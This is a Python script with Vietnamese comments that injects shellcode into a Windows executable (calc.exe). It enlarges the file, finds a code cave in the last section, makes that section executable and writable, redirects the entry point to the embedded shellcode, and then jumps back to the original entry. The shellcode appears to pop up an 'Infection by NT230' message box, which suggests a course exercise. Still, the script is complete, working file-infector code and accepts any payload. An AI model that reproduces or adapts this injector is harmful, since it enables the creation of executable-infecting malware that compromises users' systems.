#!/usr/bin/env python3

import sys
import pefile
import mmap
import os

#Tim vi tri trong trong section cuoi
# Tra ve Virtual and Raw addresses
def FindEnd():
    global pe
    filedata = open(file, "rb") # Doc File

    # Set PE file Image Base
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)

    # Set thong tin section cuoi
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1

    # Tim trong section cuoi vi tri ket thuc
    if pe.sections[last_section].SizeOfRawData != 0:
        position = 0
        count = 0
        filedata.seek(pe.sections[last_section].PointerToRawData, 0)
        data = filedata.read(pe.sections[last_section].SizeOfRawData) #Doc file tu rawdata
        for byte in data: #data chua 1 chuoi byte
            position += 1
            if byte == 0x00:
                count += 1 
            else:
                if count > 60: #neu co tren 60 byte trong, ghi nhan lai
                    raw_addr = pe.sections[last_section].PointerToRawData + position - count - 1
                    vir_addr = image_base_hex + pe.sections[last_section].VirtualAddress + position - count - 1
                    pe.sections[last_section].Characteristics = 0xE0000040 # CODE | EXECUTE | READ | WRITE
                    return vir_addr, raw_addr 
                count = 0
    filedata.close()

# Load file 
file = "calc.exe"

# Tang size cua file them 0x2000
original_size = os.path.getsize(file)
fd = open(file, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

# Load file vao pefile object
pe = pefile.PE(file)

shellcode = bytes(
b""
b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31"
b"\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
b"\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3"
b"\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
b"\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31"
b"\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
b"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a"
b"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb"
b"\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
b"\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8"
b"\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
b"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d"
b"\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x33"
b"\x30\x58\x20\x68\x20\x4e\x54\x32\x68\x6e\x20\x62"
b"\x79\x68\x63\x74\x69\x6f\x68\x49\x6e\x66\x65\x31"
b"\xdb\x88\x5c\x24\x12\x89\xe3\x68\x34\x36\x58\x20"
b"\x68\x35\x32\x30\x35\x68\x36\x5f\x32\x30\x68\x32"
b"\x31\x34\x35\x68\x5f\x32\x30\x35\x68\x31\x32\x39"
b"\x35\x68\x32\x30\x35\x32\x31\xc9\x88\x4c\x24\x1a"
b"\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0"
)



# Save file to variable
newFile = file

try:
    newEntryPoint, newRawOffset = FindEnd()
except:
    sys.exit(" Error: not find space")

# Luu Image Base
image_base = pe.OPTIONAL_HEADER.ImageBase

# Luu EntryPoint cu
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint) 

# Dia chi entry point moi (shellcode)
pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - image_base

# Chinh SizeofImage them 0x2000 nhu da tang o file
pe.OPTIONAL_HEADER. SizeOfImage += 0x2000

# Dia chi tra ve sau khi goi shellcode
returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

# Them lenh return address
shellcode += (b"\xB8" + returnAddress) #Call Eax voi EntryPoint
shellcode += (b"\xFF\xD0") #Mov Eax

# Injects Shellcode
pe.set_bytes_at_offset(newRawOffset, shellcode)

# Save and close files
pe.write(newFile)

pe.close()
print("\n")
